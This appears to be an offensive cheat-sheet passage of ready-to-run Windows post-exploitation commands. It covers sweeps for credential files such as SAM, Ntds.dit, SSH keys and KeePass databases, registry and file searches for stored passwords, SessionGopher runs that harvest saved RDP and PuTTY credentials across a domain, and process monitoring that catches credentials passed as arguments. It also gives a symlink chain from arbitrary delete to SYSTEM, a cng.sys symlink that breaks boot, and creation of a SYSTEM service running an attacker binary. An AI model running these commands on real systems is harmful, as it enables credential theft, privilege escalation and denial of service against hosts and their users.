dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.cer == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == ntuser.dat 2>nul | findstr /v ".dll"
```
<!-- cheat -->

### find unattend (powershell)

```powershell title:"Find unattend/sysprep config files via Get-Childitem"
Get-Childitem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
<!-- cheat -->

### WinVNC password

```cmd title:"Read ORL WinVNC password from registry"
reg query "HKCU\Software\ORL\WinVNC3\Password"
```
<!-- cheat -->

### SNMP service

```cmd title:"Read SNMP service registry recursively"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
```
<!-- cheat -->

### TightVNC server

```cmd title:"Read TightVNC server settings from registry"
reg query "HKCU\Software\TightVNC\Server"
```
<!-- cheat -->

### grep config files for password

```cmd title:"Grep xml/ini/txt/config files for the string password"
findstr /si password *.xml *.ini *.txt *.config
```
<!-- cheat -->

### grep all files for password

```cmd title:"Grep every file recursively for the string password"
findstr /spin "password" *.*
```
<!-- cheat -->

### locate file

```cmd title:"Locate a specific filename anywhere on C:\"
where /R C:\ $file
```
<!-- cheat
var file
-->

### registry search HKLM (keys)

```cmd title:"Search HKLM key names for password"
REG QUERY HKLM /F "password" /t REG_SZ /S /K
```
<!-- cheat -->

### registry search HKCU (keys)

```cmd title:"Search HKCU key names for password"
REG QUERY HKCU /F "password" /t REG_SZ /S /K
```
<!-- cheat -->

### registry search HKLM (data)

```cmd title:"Search HKLM REG_SZ values for password"
REG QUERY HKLM /F "password" /t REG_SZ /S /d
```
<!-- cheat -->

### registry search HKCU (data)

```cmd title:"Search HKCU REG_SZ values for password"
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
<!-- cheat -->

### SessionGopher (local)

```powershell title:"Run SessionGopher locally for saved RDP/PuTTY/WinSCP/FileZilla creds"
Import-Module $module_path; Invoke-SessionGopher -Thorough
```
<!-- cheat
var module_path
-->

### SessionGopher (domain)

```powershell title:"Run SessionGopher across the domain with provided creds"
Invoke-SessionGopher -AllDomain -u $domain\$user -p $pass
```
<!-- cheat
var domain
var user
var pass
-->

## Misc

### monitor process command lines

```powershell title:"Continuously diff process command lines to catch creds in argv"
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
<!-- cheat -->

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

### Config.Msi ADS delete

```cmd title:"DeleteFileW on Config.Msi index allocation stream"
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
<!-- cheat -->

### junction to RPC Control

```cmd title:"Junction a folder to the RPC Control object namespace"
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
<!-- cheat -->

### symlink RPC entry to Config.Msi

```cmd title:"Symlink RPC Control entry to Config.Msi index stream"
CreateSymlink "\\RPC Control\\file1.txt" "C:\\Config.Msi::$INDEX_ALLOCATION"
```
<!-- cheat -->

### stage iconics_user temp

```cmd title:"Pre-create iconics_user log dir for RegPwn-style symlink chain"
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
```
<!-- cheat -->

### mount RPC Control

```cmd title:"Replace staged folder with RPC Control mount point"
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
```
<!-- cheat -->

### symlink to cng.sys

```cmd title:"Symlink RPC Control log entry to cng.sys for boot DoS"
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
<!-- cheat -->

## From High Integrity to System

### create SYSTEM service

```cmd title:"Create a SYSTEM service pointing at attacker-controlled binary"
sc create $service binPath= "$binary_path"
```
<!-- cheat
var service
var binary_path
-->

### start SYSTEM service

```cmd title:"Start the freshly-created SYSTEM service"
sc start $service
```
<!-- cheat
var service
-->
